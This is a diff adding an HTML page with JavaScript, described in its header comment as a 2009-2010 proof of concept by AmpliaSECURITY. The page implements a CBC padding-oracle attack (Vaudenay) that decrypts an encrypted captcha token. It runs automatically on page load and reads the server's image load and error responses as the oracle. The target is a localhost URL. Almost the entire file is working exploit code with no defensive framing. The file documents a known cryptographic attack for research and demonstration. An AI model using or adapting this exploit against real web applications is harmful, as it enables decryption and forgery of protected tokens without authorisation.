@@ -1,0 +1,410 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<!-- 
+  (c) 2009-2010 AmpliaSECURITY
+  Agustin Azubel - aazubel@ampliasecurity.com
+
+  Vaudenay + Rizzo-Duong proof of concept.
+
+  Decrypt captcha using Vaudenay's cbc-padding-oracle-side-channel,
+  Encrypt captcha using Rizzo-Duong CBC-R technique.
+-->
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+</head>
+<body>
+  <div id="image"></div>
+  <div id="efficiency"></div>
+  <div id="progress"></div>
+  <div id="state"></div>
+  <div id="url"></div>
+  <div id="text"></div>
+  <div id="response"></div>
+</html>
+
+<script type="text/javascript">
+
+var attack = null;
+window.onload = function() {
+  attack = new LocalhostCbcPaddingOracleAttack(); attack.setup(); attack.decrypt();
+}
+
+
+function CbcPaddingOracleAttack() {
+  this.base_url;
+  this.tries = 0;
+  this.b = 8;
+  this.iv = new Array();
+  this.blocks = new Array();
+  this.template_r = new Array(1 + this.b);
+  this.r = new Array(1 + this.b);
+  this.a = new Array(1 + this.b);
+  this.d = new Array(1 + this.b);
+  this.encrypted_text = new Array();
+  this.decrypted_text = new Array();
+  this.state;
+
+  this.fatal = function(message) {
+   this.set_state("attack_failed");
+    alert(message);
+    throw message;
+  }
+
+  this.set_text_element = function(id, text) {
+    document.getElementById(id).innerHTML = "" +
+      "<p>" + 
+        text +
+      "</p>";
+  }
+
+  this.set_image_element = function(id, image) {
+    document.getElementById(id).innerHTML = "" +
+      "<img" +
+        " src = '" + image + "'" +
+      " />";
+  }
+
+  this.set_handled_image_element = function(id, image) {
+    document.getElementById(id).innerHTML = "" +
+      "<img" +
+        " src = '" + image + "'" +
+        " onLoad = 'image_on_load()'" +
+        " onError = 'image_on_error()'" +
+        " style = 'display: none'" +
+      " />";
+  }
+
+  this.setup = function() {
+    var tokens = this.url_parser.exec(this.url);
+    if (tokens == null || tokens.length != 3) {
+      this.fatal("Invalid url: " + this.url);
+    }
+    this.base_url = tokens[1];
+    var ciphertext = tokens[2];
+
+    var ciphertext = Base64.decode(Base64.unescape(ciphertext));
+    if (ciphertext.length%this.b != 0) {
+      this.fatal("invalid cookie!!!");
+    }
+
+    for (var i = 0; i < ciphertext.length/this.b; i++) {
+      offset = i * this.b
+      var text = ciphertext.slice(offset, offset + this.b);
+      var block = new Array(1 + this.b);
+      for (j = 0; j < this.b ; j++) {
+        block[j+1] = text.charCodeAt(j);
+      }
+      this.blocks.push(block);
+    }
+    this.iv = this.blocks.shift();
+
+    this.set_image_element("image", this.url)
+
+    this.encrypted_text = new Array(this.blocks.length * this.b);
+    for (i = 0; i < this.encrypted_text.length; i++) {
+      this.encrypted_text[i] = "?".charCodeAt(0);
+    }
+
+    this.set_text_element("text", 
+      "text: " + this.encrypted_text.pack() + this.decrypted_text);
+
+    maximum = this.b * 256 * this.blocks.length;
+    average = maximum/2;
+    this.set_text_element("efficiency",
+      "efficiency: (maximum, average) " + maximum + ", " + average);
+  }
+
+  this.ask_oracle = function() {
+    this.tries += 1;
+    captcha = this.r.pack() + this.y.pack();
+    captcha = Base64.escape(Base64.encode(captcha));
+    var ask_url = this.base_url + captcha;
+
+    this.set_text_element("progress",
+      "progress: (total/round) " + this.tries + "/" + this.i);
+    this.set_text_element("url", "url: " + ask_url);
+    this.set_handled_image_element("response", ask_url);
+  }
+
+  image_on_load = function() {
+    attack.set_state("r_verified");
+    attack.main_loop()
+  }
+
+  image_on_error = function() {
+    attack.set_state("r_unverified");
+    attack.main_loop();
+  }
+
+  this.set_state = function(state) {
+    document.getElementById("state").innerHTML = "" +
+      "<p>" + 
+        "state: " + state +
+      "</p>"
+    this.state = state;
+  }
+
+  this.is_state = function(state) {
+    return (this.state == state);
+  }
+
+  this.main_loop = function() {
+    for (;;) {
+      if (this.is_state("attack_started")) {                // select_block
+        if (this.blocks.length == 0) {
+          this.set_state("attack_finished");
+          continue;
+        }
+
+        this.y = this.blocks.pop();
+        this.set_state("block_selected");
+        continue;
+
+      } else if (this.is_state("block_selected")) {         // select_word
+        this.j = 8 + 1;  // the attack will get a[j-1]
+
+        this.set_state("word_selected");
+        continue;
+
+      } else if (this.is_state("word_selected")) {          // select_template_r
+        // 1. take r[k] = a[k] xor ( b - j + 2) for k = j,...,b
+        for (var k = this.j; k <= this.b; k++) {
+          this.template_r[k] = this.a[k] ^(this.b - this.j + 2);
+        }
+
+        if (this.template_r[0] == undefined) {
+          this.template_r[0] = 0x00;
+          // 2. pick r[1],...,r[j-1] at random and take i = 0
+          for (var i = 1; i <= (this.j-1); i++) {
+            this.template_r[i] = Math.floor(Math.random() * 256);
+          }
+        }
+        this.i = 0;
+
+        this.set_state("template_r_selected");
+        continue;
+
+      } else if (this.is_state("template_r_selected")) {    // select_r
+        // 3. take r = r[1]...r[j-2](r[j-1] xor i)r[j]..r[b]
+        this.r = this.template_r.clone();
+        this.r[this.j-1] = this.r[this.j-1] ^ this.i;
+
+        this.set_state("r_selected");
+        continue;
+
+      } else if (this.is_state("r_selected")) {              // ask_oracle
+        // if O(r|y) = 0 then increment i and go back to
+        // the previous step
+        this.ask_oracle()
+
+        // yield
+        break;
+
+      } else if (this.is_state("r_unverified")) {    // discard_r
+        this.i += 1;
+        if (this.i > 255) {
+          this.fatal("can not decrypt word");
+        }
+
+        this.set_state("template_r_selected");
+        continue;
+
+      } else if (this.is_state("r_verified")) {         // save_r
+        // 5. output r[j-1] xor i xor (b - j + 2)
+        this.r = this.template_r.clone();
+        this.a[this.j-1] = (this.r[this.j-1] ^ this.i) ^ (this.b - this.j + 2);
+
+        var prev_block = new Array();
+        if (this.blocks.length > 0) {
+          prev_block = this.blocks[this.blocks.length-1];
+        } else {
+          prev_block = this.iv;
+        }
+        this.d[this.j-1] = prev_block[this.j-1] ^ this.a[this.j-1];
+
+        this.decrypted_text.unshift(this.d[this.j-1]);
+        this.encrypted_text.shift();
+        this.set_text_element("text",
+          "text: " + this.encrypted_text.full_pack() +
+          this.decrypted_text.full_pack());
+
+        if (this.j-1 > 1) {
+          this.j -= 1;
+
+          this.set_state("word_selected");
+          continue;
+        }
+
+        this.set_state("attack_started");
+        continue;
+
+      } else if (this.is_state("attack_finished")) {    // exit
+        alert("attack succeded!");
+        break;
+      }
+    }
+  }
+
+  this.decrypt = function() {
+    this.set_state("attack_started");
+    this.main_loop();
+  }
+}
+
+
+function LocalhostCbcPaddingOracleAttack() {
+  this.inheritFrom =  CbcPaddingOracleAttack;
+  this.inheritFrom();
+
+  //  "secret!\x01"
+  //this.url = "http://localhost:8000/securityWord=ABEiM0RVZnfzETs5FIutcg%3D%3D";
+  // "first__second\x02\x02"
+  this.url = "http://localhost:8000/securityWord=ABEiM0RVZncWMiDu65SC2C%2FtvfLbL7nT";
+
+  this.url_parser = /(.*securityWord=)(.*)/;
+
+/*
+  this.setup = function() {
+    this.iv = [ 0x00, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77 ];
+    // "secret!\x01"
+    this.blocks.push([ 0x00, 0xf3, 0x11, 0x3b, 0x39, 0x14, 0x8b, 0xad, 0x72 ]);
+  }
+*/
+}
+
+
+Array.prototype.full_pack = function() {
+  packed = new String();
+  for (var i = 0; i < this.length; i++) {
+    packed +=  String.fromCharCode(this[i]);
+  } 
+
+  return packed;
+}
+
+Array.prototype.pack = function() {
+  packed = new String();
+  // all the arrays are one-based
+  for (var i = 1; i < this.length; i++) {
+    packed +=  String.fromCharCode(this[i]);
+  } 
+
+  return packed;
+}
+
+Array.prototype.clone = function() {
+  var that = new Array(this.length);
+  for (var i = 0; i < this.length; i++) {
+    that[i] = this[i];
+  } 
+
+  return that;
+}
+
+var Base64 = {};
+Base64.escape = function(input) {
+  var output = new String(input);
+  output = output.replace(/\+/g, "%2B");
+  output = output.replace(/\//g, "%2F");
+  output = output.replace(/\=/g, "%3D");
+  return output;
+}
+
+Base64.unescape = function(input) {
+  var output = new String(input);
+  output = output.replace(/%2B/g, "+");
+  output = output.replace(/%2F/g, "/");
+  output = output.replace(/%3D/g, "=");
+
+  return output;
+}
+
+Base64.char_table = "ABCDEFGHIJKLMNOP" +
+                "QRSTUVWXYZabcdef" +
+                "ghijklmnopqrstuv" +
+                "wxyz0123456789+/" +
+                "=";
+	
+
+
+Base64.encode = function(input) {
+      var output = "";
+      var chr1, chr2, chr3 = "";
+      var enc1, enc2, enc3, enc4 = "";
+      var i = 0;
+	
+      do {
+         chr1 = input.charCodeAt(i++);
+         chr2 = input.charCodeAt(i++);
+         chr3 = input.charCodeAt(i++);
+	
+         enc1 = chr1 >> 2;
+         enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+         enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+         enc4 = chr3 & 63;
+	
+         if (isNaN(chr2)) {
+            enc3 = enc4 = 64;
+         } else if (isNaN(chr3)) {
+            enc4 = 64;
+         }
+	
+         output = output +
+            this.char_table.charAt(enc1) +
+            this.char_table.charAt(enc2) +
+            this.char_table.charAt(enc3) +
+            this.char_table.charAt(enc4);
+         chr1 = chr2 = chr3 = "";
+         enc1 = enc2 = enc3 = enc4 = "";
+      } while (i < input.length);
+	
+      return output;
+   }
+	
+   Base64.decode = function(input) {
+      var output = "";
+      var chr1, chr2, chr3 = "";
+      var enc1, enc2, enc3, enc4 = "";
+      var i = 0;
+	
+      var base64test = /[^A-Za-z0-9\+\/\=]/g;
+      if (base64test.exec(input)) {
+      }
+      input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+	
+      do {
+         enc1 = this.char_table.indexOf(input.charAt(i++));
+         enc2 = this.char_table.indexOf(input.charAt(i++));
+         enc3 = this.char_table.indexOf(input.charAt(i++));
+         enc4 = this.char_table.indexOf(input.charAt(i++));
+	
+         chr1 = (enc1 << 2) | (enc2 >> 4);
+         chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+         chr3 = ((enc3 & 3) << 6) | enc4;
+	
+         output = output + String.fromCharCode(chr1);
+	
+         if (enc3 != 64) {
+            output = output + String.fromCharCode(chr2);
+         }
+         if (enc4 != 64) {
+            output = output + String.fromCharCode(chr3);
+         }
+	
+         chr1 = chr2 = chr3 = "";
+         enc1 = enc2 = enc3 = enc4 = ""; 
+	
+      } while (i < input.length);
+	
+      return output;
+   }
+
+
+
+
+
+
+</script>
